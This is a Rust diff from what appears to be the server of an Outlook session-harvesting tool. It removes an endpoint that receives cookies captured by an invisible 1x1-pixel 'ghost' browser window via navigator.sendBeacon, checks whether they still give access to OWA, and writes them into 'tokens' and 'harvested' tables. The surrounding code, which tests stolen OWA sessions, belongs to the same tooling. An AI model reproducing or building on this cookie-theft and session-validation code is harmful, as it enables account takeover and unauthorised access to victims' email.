@@ -79,13 +79,6 @@ pub struct SyncCookiesRequest {
     user_agent: Option<String>,
 }
 
-#[derive(Deserialize)]
-pub struct GhostSessionRequest {
-    token_id: String,
-    cookies: String,
-    user_agent: Option<String>,
-}
-
 #[derive(Serialize)]
 pub struct SyncCookiesResponse {
     status: String,
@@ -192,85 +185,6 @@ impl CookieClient {
             anyhow::bail!("OWA returned status {}: {}", status, &text[..text.len().min(200)])
         }
     }
-}
-
-/// Capture session from ghost window (invisible cookie capture)
-/// The ghost window is a 1x1 pixel browser window opened to Outlook
-/// It reads document.cookie and sends it here via navigator.sendBeacon
-pub async fn ghost_session_capture_handler(
-    body: web::Json<GhostSessionRequest>,
-    state: web::Data<AppState>,
-) -> impl Responder {
-    let token_id = &body.token_id;
-    let cookies = &body.cookies;
-    let user_agent = body.user_agent.as_deref().unwrap_or("Ghost Window");
-    let cookie_count = cookies.split(';').filter(|s| !s.trim().is_empty()).count();
-    
-    println!("[ghost] Session capture attempt for token {}: {} cookies", token_id, cookie_count);
-    
-    // Test if cookies are valid
-    let client = CookieClient::new(cookies, Some(user_agent));
-    let is_valid = client.test_session().await;
-    
-    let session_status = if is_valid { "active" } else { "pending" };
-    let now = Utc::now();
-    
-    // Update tokens table
-    let result = sqlx::query(
-        "UPDATE tokens SET cookie_session = ?, session_status = ?, session_active_at = ? WHERE id = ?"
-    )
-    .bind(cookies)
-    .bind(session_status)
-    .bind(now)
-    .bind(token_id)
-    .execute(&state.pool)
-    .await;
-    
-    if let Err(e) = &result {
-        eprintln!("[ghost] Failed to update tokens table: {}", e);
-    }
-    
-    // Update harvested table
-    let _ = sqlx::query(
-        "UPDATE harvested SET cookie_session = ?, session_status = ?, session_active_at = ? WHERE id = ?"
-    )
-    .bind(cookies)
-    .bind(session_status)
-    .bind(now)
-    .bind(token_id)
-    .execute(&state.pool)
-    .await;
-    
-    // Audit log
-    let _ = crate::audit::insert_audit_log(
-        &state.pool,
-        "ghost_session_captured",
-        None,
-        Some(token_id),
-        None,
-        Some("ghost_window"),
-        Some(user_agent),
-        Some(serde_json::json!({
-            "cookie_count": cookie_count,
-            "valid": is_valid,
-            "session_status": session_status
-        })),
-        true,
-    ).await;
-    
-    let status = if is_valid { "active" } else { "pending" };
-    let message = if is_valid {
-        "Ghost session captured and verified. Cookies are valid."
-    } else {
-        "Ghost session captured but cookies could not be verified. They may be HttpOnly or incomplete."
-    };
-    
-    HttpResponse::Ok().json(SyncCookiesResponse {
-        status: status.to_string(),
-        token_id: token_id.clone(),
-        message: message.to_string(),
-        cookie_count,
-    })
 }
 
 /// Get session status for a token (token-based: checks OAuth token validity)
